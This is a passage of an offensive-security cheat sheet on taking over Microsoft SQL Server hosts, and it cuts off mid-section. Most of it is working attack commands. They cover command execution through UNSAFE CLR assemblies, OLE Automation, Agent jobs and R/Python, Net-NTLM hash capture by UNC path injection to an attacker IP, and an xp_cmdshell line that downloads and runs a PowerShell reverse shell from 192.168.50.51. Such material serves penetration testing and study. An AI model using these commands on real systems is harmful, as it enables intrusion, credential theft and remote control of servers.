&lt;h4 id="sysadmin-to-os-service-account---command-execution-with-clr-assemblies">Sysadmin to OS Service Account - Command Execution with CLR assemblies&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>&lt;code>HeidiSQL&lt;/code>:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Creating the DLL using the file &lt;strong>cmd_exec.cs&lt;/strong>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Compile the DLL that can be loaded from a local path or a UNC path:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Windows&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Microsoft&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">NET&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Framework64&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">v4&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">30319&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">csc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">target&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">library&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">labuser&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Desktop&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">cmd_exec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cs&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Execute the commands:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- Enable CLR
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">msdb&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Enable show advanced options on the server
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">sp_configure&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;show advanced options&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">RECONFIGURE&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Enable CLR on the server
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">sp_configure&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;clr enabled&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">RECONFIGURE&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">GO&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Import the assembly and use the stored procedure:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">---- Import the assembly from a file (UNC Path)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">CREATE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ASSEMBLY&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">my_assembly&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;\\192.168.15.2\fileserver\cmd_exec.dll&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WITH&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">PERMISSION_SET&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">UNSAFE&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">GO&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">---- Link the assembly to a stored procedure
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">CREATE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">PROCEDURE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">dbo&lt;/span>&lt;span class="p">].[&lt;/span>&lt;span class="n">cmd_exec&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="n">execCommand&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">NVARCHAR&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4000&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">EXTERNAL&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">NAME&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">my_assembly&lt;/span>&lt;span class="p">].[&lt;/span>&lt;span class="n">StoredProcedures&lt;/span>&lt;span class="p">].[&lt;/span>&lt;span class="n">cmd_exec&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">GO&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">cmd_exec&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">GO&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Cleanup
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">DROP&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">PROCEDURE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">cmd_exec&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">DROP&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ASSEMBLY&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">my_assembly&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Reference: &lt;a href="https://blog.netspi.com/attacking-sql-server-clr-assemblies/" target="_blank" rel="noopener">https://blog.netspi.com/attacking-sql-server-clr-assemblies/&lt;/a>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>
&lt;p>&lt;code>PowerUpSQL&lt;/code>:&lt;/p>
&lt;ol>
&lt;li>Following command can be used to create C# code for the DLL, the DLL and SQL query with DLL as hexadecimal string:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Create-SQLFileCLRDll&lt;/span> &lt;span class="n">-ProcedureName&lt;/span> &lt;span class="s2">&amp;#34;runcmd&amp;#34;&lt;/span> &lt;span class="n">-OutFile&lt;/span> &lt;span class="s2">&amp;#34;runcmd&amp;#34;&lt;/span> &lt;span class="n">-OutDir&lt;/span> &lt;span class="s2">&amp;#34;C:\Users\labuser\Desktop&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Import the stored procedure from the generated string:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">CREATE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ASSEMBLY&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">NMfsa&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AUTHORIZATION&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">dbo&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="n">x4D5A90&lt;/span>&lt;span class="err">……&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
&lt;li>Below command can be used to list all the stored procedures added using CLR:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLStoredProcedureCLR&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
&lt;li>Use below for automated enabling, executing command and reading output using CLR assembly:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLOSCmdCLR&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password1&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s2">&amp;#34;whoami&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLOSCmdCLR&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password1&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s2">&amp;#34;powershell -e &amp;lt;base64encodedscript&amp;gt;&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h4 id="sysadmin-to-os-service-account---command-execution-with-ole-automation-procedures">Sysadmin to OS Service Account - Command Execution with OLE Automation Procedures&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>&lt;code>HeidiSQL&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- Enable Ole Automation Stored Procedures
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">sp_configure&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;show advanced options&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">GO&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">RECONFIGURE&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">GO&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">sp_configure&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;Ole Automation Procedures&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">GO&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">RECONFIGURE&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">GO&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Execute command
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">DECLARE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="k">output&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">INT&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">DECLARE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="n">ProgramToRun&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">VARCHAR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">255&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SET&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="n">ProgramToRun&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;Run(&amp;#34;calc.exe&amp;#34;)&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sp_oacreate&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;wScript.Shell&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="k">output&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">out&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sp_oamethod&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="k">output&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="n">ProgramToRun&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sp_oadestroy&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="k">output&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h4 id="sysadmin-to-os-service-account---command-execution-with-agent-jobs">Sysadmin to OS Service Account - Command Execution with Agent Jobs&lt;/h4>
&lt;p>SQL Server Agent is a Windows service that executes scheduled tasks or jobs:&lt;/p>
&lt;ul>
&lt;li>Subsystem PowerShell&lt;/li>
&lt;li>Subsystem CmdExec&lt;/li>
&lt;li>Subsystem VBScript&lt;/li>
&lt;li>Subsystem Jscript&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;p>Execute commands:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLOSCmdAgentJob&lt;/span> &lt;span class="n">-Subsystem&lt;/span> &lt;span class="n">PowerShell&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password1&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s2">&amp;#34;powershell -e &amp;lt;base64encodedscript&amp;gt;&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>List all jobs:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLAgentJob&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">Password&lt;/span> &lt;span class="s2">&amp;#34;Pass@123&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h4 id="sysadmin-to-os-service-account---command-execution-with-external">Sysadmin to OS Service Account - Command Execution with external&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLOSCmdR&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password1&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s2">&amp;#34;powershell -e &amp;lt;base64encodedscript&amp;gt;&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLOSCmdPython&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password1&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s2">&amp;#34;powershell -e &amp;lt;base64encodedscript&amp;gt;&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Reference:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://gist.github.com/james-otten/63389189ee73376268c5eb676946ada5" target="_blank" rel="noopener">https://gist.github.com/james-otten/63389189ee73376268c5eb676946ada5&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server" target="_blank" rel="noopener">https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server&lt;/a>&lt;/li>
&lt;/ul>
&lt;h3 id="public-to-os-service-account">Public to OS Service Account&lt;/h3>
&lt;h4 id="public-to-os-service-account---unc-path-injection">Public to OS Service Account - UNC Path Injection&lt;/h4>
&lt;p>A very well known method to capture Net-NTLM (also known as NTLMv1/v2) hashes. Stored procedures like &lt;strong>xp_dirtree&lt;/strong> and &lt;strong>xp_fileexist&lt;/strong> can be used to capture Net-NTLM hashes. The captured hashes can be cracked using John-the-Ripper, Hashcat etc&lt;/p>
&lt;p>PowerUpSQL automates this impressively (uses Inveigh &lt;a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Inveigh&lt;/a> as a capture server):&lt;/p>
&lt;ol>
&lt;li>Gets SQL Server SPNs&lt;/li>
&lt;li>Attempt to log into each&lt;/li>
&lt;li>Performs UNC path injection&lt;/li>
&lt;li>Capture password hashes&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLUncPathInjection&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-CaptureIp&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ATTACKER_IP&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>More in UNC Path Injection cheatsheet: &lt;a href="https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e" target="_blank" rel="noopener">https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e&lt;/a>&lt;/p>
&lt;p>If the process cannot be automatized, it is necessary first to start on a machine:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Inveigh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">Inveigh&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">psd1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Inveigh&lt;/span> &lt;span class="n">-FileOutput&lt;/span> &lt;span class="n">Y&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>then on HeidiSQL connect to the database and execute one of the following queries by replacing the correct attacker IP:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">xp_dirtree&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;\\attackerip\file&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">xp_fileexist&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;\\attackerip\file&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="os-service-account-to-local-system">OS Service Account to Local SYSTEM&lt;/h3>
&lt;h4 id="os-service-account-to-local-system---rotten-potato">OS Service Account to Local SYSTEM - Rotten Potato&lt;/h4>
&lt;p>Reference: &lt;a href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/" target="_blank" rel="noopener">https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/&lt;/a>&lt;/p>
&lt;h4 id="os-service-account-to-local-system---juicy-potato">OS Service Account to Local SYSTEM - Juicy Potato&lt;/h4>
&lt;p>Reference: &lt;a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="noopener">https://github.com/ohpe/juicy-potato&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Listener&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-v&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">443&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get command execution&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLServerLinkCrawl&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="n">INSTANCE&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;EXEC master..xp_cmdshell &amp;#39;powershell.exe iex (iwr http://192.168.50.51/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.50.51 -Port 443&amp;#39;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Grab Juicy potato&lt;/span>
